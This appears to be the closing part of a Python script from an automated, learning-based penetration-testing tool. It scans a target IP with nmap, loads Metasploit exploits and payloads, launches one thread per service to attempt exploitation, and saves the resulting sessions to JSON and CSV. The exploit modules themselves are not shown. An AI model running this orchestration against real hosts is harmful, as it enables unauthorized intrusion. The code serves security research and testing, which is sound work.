                                        '    exploit      : {3}\n'
                                        '    target       : {4}\n'
                                        '    payload      : {5}'.format(session['id'],
                                                                        session['type'],
                                                                        session['port'],
                                                                        session['exploit'],
                                                                        session['target'],
                                                                        session['payload']))

# Check IP address format.
def is_valid_ip(rhost):
    try:
        ipaddress.ip_address(rhost)
        return True
    except ValueError:
        return False


# Define command option.
__doc__ = """{f}
Usage:
    {f} (-t <ip_addr> | --target <ip_addr>) (-m <mode> | --mode <mode>)
    {f} (-t <ip_addr> | --target <ip_addr>) [(-p <port> | --port <port>)] [(-s <product> | --service <product>)]
    {f} -h | --help

Options:
    -t --target   Require  : IP address of target server.
    -m --mode     Require  : Execution mode "train/test".
    -p --port     Optional : Indicate port number of target server.
    -s --service  Optional : Indicate product name of target server.
    -h --help     Optional : Show this screen and exit.
""".format(f=__file__)


# Parse command arguments.
def command_parse():
    args = docopt(__doc__)
    ip_addr = args['<ip_addr>']
    return ip_addr


# Common list of all threads.
com_port_list = []
com_exploit_list = []
com_payload_list = []
com_indicate_flag = False


if __name__ == '__main__':
    util = Utilty()

    # Get command arguments.
    rhost = command_parse()
    if is_valid_ip(rhost) is False:
        util.print_message(FAIL, 'Invalid IP address: {}'.format(rhost))
        exit(1)

    # Initialization of Metasploit.
    env = Metasploit(rhost)
    if rhost in env.prohibited_list:
        util.print_message(FAIL, 'Target IP={} is prohibited.\n'
                                 '    Please check "config.ini"'.format(rhost))
        exit(1)    
    nmap_result = os.getcwd() + '/nmap_result_' + env.rhost + '.xml'
    nmap_command = env.nmap_command + ' ' + nmap_result + ' ' + env.rhost + '\n'
    # env.execute_nmap(env.rhost, nmap_command, env.nmap_timeout)
    com_port_list, proto_list, info_list = env.get_port_list(env.rhost, nmap_command, env.nmap_timeout, nmap_result)
    com_exploit_list = env.get_exploit_list()
    com_payload_list = env.get_payload_list()
    com_payload_list.append('no payload')

    # Create exploit tree.
    exploit_tree = env.get_exploit_tree()
    target_tree = env.get_target_info(rhost, proto_list, info_list)    

    env.client.termination(env.client.console_id)  # Disconnect common MSFconsole.
    NUM_ACTIONS = len(com_payload_list)  # Set action number.
    NONE_STATE = np.zeros(NUM_STATES)  # Initialize state (s).

    # Define global variable, start TensorFlow session.
    frames = 0                # All trial number of all threads.
    isFinish = False          # Finishing learning/testing flag.
    post_exploit_count = 0    # Number of successful post-exploitation.
    exploit_count = 0         # Number of successful exploitation.
    plot_count = [0]          # Exploitation count list for plot.
    plot_pcount = [0]         # Post-exploit count list for plot.

    service_list = target_tree['service_list']
    port_list = target_tree['opened_port_list']
    TRAIN_WORKERS = len(service_list)
    threads = []
    worker_list = []

    worker = Environment(rhost)
    for idx in range(len(service_list)):
        worker_list.append('t'+str(idx + 1))
        worker_list[idx] = threading.Thread(target=worker.run, args=(exploit_tree, target_tree, service_list[idx], port_list[idx]))
        threads.append(worker_list[idx])
        worker_list[idx].start()

    for t in threads:
        t.join()

    saved_file = os.path.join(env.data_path, 'target_info_' + rhost + '.json')
    fin = codecs.open(saved_file, 'r', 'utf-8')
    target_tree = json.loads(fin.read().replace('\0', ''))
    fin.close()

    target_tree.update({'session_reverse':len(session_list)})
    target_tree.update({'session_list':session_list})
    if len(session_list) == 0:
        target_tree.update({'exploit_sucess':False})
    else:
        target_tree.update({'exploit_sucess':True})
        
    fout = codecs.open(saved_file, 'w', 'utf-8')
    json.dump(target_tree, fout, indent=4)
    fout.close()  

    # dataset_file = os.path.join(env.data_path, 'target_dataset.csv')
    # data = pd.read_csv(dataset_file)
    # headers = list(data.columns.values)
    # # del target_tree['rhost']
    # for col in headers:
    #     try:
    #         if target_tree[col] == None:
    #             continue
    #     except Exception as e:
    #         target_tree.update({'None':0})

    del target_tree['rhost']
    target_tree_csv = pd.DataFrame([target_tree])
    target_tree_csv.to_csv(os.path.join(env.data_path, 'target_dataset.csv'), mode='a', header=False, index=False)
    util.print_message(OK, 'Saved target_dataset.csv')
    